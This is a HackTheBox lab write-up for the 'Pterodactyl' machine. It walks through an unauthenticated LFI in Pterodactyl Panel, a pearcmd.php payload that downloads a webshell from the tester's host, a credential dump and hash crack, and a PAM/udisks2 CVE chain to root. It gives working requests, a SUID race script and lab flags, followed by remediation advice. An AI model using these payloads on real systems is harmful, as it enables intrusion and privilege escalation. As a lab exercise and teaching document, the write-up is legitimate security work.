# Penetration Test Report — HackTheBox: Pterodactyl

**Date:** April 8, 2026  
**Target:** Pterodactyl (HackTheBox)  
**Difficulty:** Medium  
**OS:** Linux (openSUSE Leap 15.6)  
**Tester:** V0idW1re

---

## Executive Summary

The Pterodactyl machine on HackTheBox presented a realistic attack scenario involving a misconfigured web application and chained privilege escalation vulnerabilities. Starting from an unauthenticated position, the tester achieved full root compromise through a logical sequence of exploitation steps. The attack chain involved an unauthenticated Local File Inclusion vulnerability, creative abuse of a PHP package manager for remote code execution, credential extraction and cracking, and finally chaining two publicly disclosed CVEs to escalate from a low-privileged user to root.

---

## Scope

| Field | Value |
|---|---|
| Target IP | 10.129.25.223 |
| Hostname | pterodactyl.htb |
| OS | openSUSE Leap 15.6 |
| Services | SSH (22), HTTP (80) |
| Subdomains | panel.pterodactyl.htb |

---

## Methodology

The assessment followed a standard penetration testing methodology:

1. Reconnaissance and Service Enumeration
2. Web Application Analysis
3. Initial Exploitation
4. Post-Exploitation and Lateral Movement
5. Privilege Escalation
6. Proof of Compromise

---

## Findings

### Finding 1 — Unauthenticated Local File Inclusion (CVE-2025-49132)

**Severity:** Critical  
**Component:** Pterodactyl Panel v1.11.10 — `/locales/locale.json` endpoint

**Description:**  
The Pterodactyl Panel's locale endpoint failed to sanitize the `locale` and `namespace` query parameters, allowing directory traversal. Because the application appended `.php` to the namespace value and loaded it via PHP's include mechanism, an attacker could force the server to load and execute arbitrary PHP files on the filesystem.

**Exploit:**
```
GET /locales/locale.json?locale=../../../../../../var/www/pterodactyl/&namespace=config/database
```

**Impact:**  
Database credentials were extracted from `config/database.php`:
- Username: `pterodactyl`
- Password: `PteraPanel`
- Database: `panel`

The Laravel application key was also extracted from `config/app.php`.

**Evidence:**
```json
{"connections":{"mysql":{"username":"pterodactyl","password":"PteraPanel"}}}
```

---

### Finding 2 — Remote Code Execution via pearcmd.php

**Severity:** Critical  
**Component:** PHP PEAR installation + LFI

**Description:**  
With the LFI primitive established, the tester leveraged the PEAR package manager's `pearcmd.php` script. When the PHP configuration has `register_argc_argv=On` (confirmed via phpinfo), the query string is parsed as command-line arguments by pearcmd. The `download` command was used to fetch a PHP webshell from the attacker's server and save it to the panel's public web directory.

**Exploit:**
```
GET /locales/locale.json?locale=../../../../../../usr/share/php/PEAR/&namespace=pearcmd&+download+http://10.10.15.128:8000/shell.php
```

**Impact:**  
A PHP webshell was written to `/var/www/pterodactyl/public/shell.php`, providing unauthenticated remote code execution as the `wwwrun` user.

**Evidence:**
```
http://panel.pterodactyl.htb/shell.php?cmd=id
uid=474(wwwrun) gid=477(www) groups=477(www)
```

---

### Finding 3 — Cleartext Database Credentials and Weak Password Storage

**Severity:** High  
**Component:** MySQL panel database

**Description:**  
Using the RCE shell, the tester connected to the MySQL database using the credentials obtained via LFI. The `users` table contained bcrypt-hashed passwords for all panel users. The hash for user `phileasfogg3` was cracked offline using a common wordlist.

**Exploit:**
```sql
SELECT username, password FROM users;
```

**Cracked Credential:**
- Username: `phileasfogg3`
- Password: `!QAZ2wsx`

**Impact:**  
SSH access was obtained as `phileasfogg3`, and the user flag was captured:
```
user.txt: 916235b4261e70fdb090402c641a7808
```

---

### Finding 4 — PAM Environment Privilege Bypass (CVE-2025-6018)

**Severity:** High  
**Component:** PAM configuration — `pam_env.so` with `user_readenv=1`

**Description:**  
The PAM configuration on openSUSE Leap 15.6 sources the user's `~/.pam_environment` file via `pam_env.so` with `user_readenv=1`. By setting specific environment variables in this file, an unprivileged SSH user can trick `systemd-logind` and Polkit into believing the session is an active physical console session, thereby gaining `allow_active` privileges.

**Exploit:**
```bash
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
```

After reconnecting via SSH, the session was recognized as `Active=yes`, enabling unprivileged calls to udisks2 D-Bus methods that normally require physical console presence.

**Evidence:**
```bash
udisksctl loop-setup -f /tmp/xfs.img
Mapped file /tmp/xfs.img as /dev/loop0.
# No authentication prompt
```

---

### Finding 5 — udisks2 XFS Resize Race Condition (CVE-2025-6019)

**Severity:** Critical  
**Component:** udisks2 v2.9.2 / libblockdev — `org.freedesktop.UDisks2.Filesystem.Resize`

**Description:**  
When udisks2 resizes an XFS filesystem via libblockdev, it temporarily mounts the filesystem image in a world-accessible directory under `/tmp/blockdev.*` without the `nosuid` and `nodev` mount flags. This creates a brief race condition window during which any SUID binary present in the image can be executed with elevated effective UID.

An attacker with `allow_active` Polkit privileges (obtained via CVE-2025-6018) can:
1. Create an XFS image containing a root-owned SUID bash binary
2. Set up a loop device via `udisksctl loop-setup`
3. Trigger the resize via D-Bus
4. Race to execute the SUID binary during the temporary nosuid-free mount window

**Critical Note on XFS Image Compatibility:**  
The XFS image must be created with specific flags for openSUSE Leap 15.6 (SP5/SP6):
```bash
mkfs.xfs -f -i exchange=0 -n parent=0 xfs.img
```

**Exploit:**
```bash
# Build malicious XFS image (on attacker machine)
dd if=/dev/zero of=xfs.img bs=1M count=300
mkfs.xfs -f -i exchange=0 -n parent=0 xfs.img
mount xfs.img /mnt
cp /bin/bash /mnt/bash
chown root:root /mnt/bash
chmod 4755 /mnt/bash
umount /mnt

# On target — race the resize window
udisksctl loop-setup -f /tmp/xfs.img
(while true; do
    /tmp/blockdev.*/bash -p -c 'cp /usr/bin/bash /tmp/rb; chmod 4755 /tmp/rb' 2>/dev/null
done) &
busctl call org.freedesktop.UDisks2 \
    /org/freedesktop/UDisks2/block_devices/loop0 \
    org.freedesktop.UDisks2.Filesystem Resize "ta{sv}" 0 0
```

**Evidence:**
```bash
/tmp/blockdev.1LYHN3/bash -p -c 'id'
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
```

**Root Flag:**
```
root.txt: d3a242011c18cb81f08ad80337330641
```

---

## Proof of Access

| Flag | Value |
|---|---|
| user.txt | 916235b4261e70fdb090402c641a7808 |
| root.txt | d3a242011c18cb81f08ad80337330641 |

---

## Privilege Escalation Summary

```
[Unauthenticated]
    ↓ CVE-2025-49132 (LFI)
[Database Credentials]
    ↓ pearcmd RCE
[wwwrun shell]
    ↓ MySQL credential dump + hash crack
[phileasfogg3 SSH]
    ↓ CVE-2025-6018 (PAM bypass → allow_active)
    ↓ CVE-2025-6019 (udisks2 XFS resize race)
[root]
```

---

## Impact

Full compromise of the target system. An attacker with this level of access could:
- Read, modify, or delete all files on the system
- Install persistent backdoors or malware
- Pivot to other systems on the network
- Access all stored credentials and sensitive data
- Disrupt or manipulate hosted services

---

## Remediation

| Finding | Remediation |
|---|---|
| CVE-2025-49132 (LFI) | Upgrade Pterodactyl Panel to v1.11.11 or later, which enforces strict alphanumeric validation on locale/namespace parameters |
| pearcmd RCE | Set `register_argc_argv=Off` in `php.ini`; remove PEAR if not needed |
| Weak password | Enforce strong password policies; use a password manager |
| CVE-2025-6018 (PAM) | Set `user_readenv=0` in PAM configuration for `pam_env.so` |
| CVE-2025-6019 (udisks2) | Upgrade udisks2 and libblockdev to patched versions; modify Polkit rule for `org.freedesktop.udisks2.modify-device` to change `allow_active` from `yes` to `auth_admin` |

---

*This report was produced for educational purposes as part of a HackTheBox lab exercise. All testing was performed on a legal, isolated lab environment.*
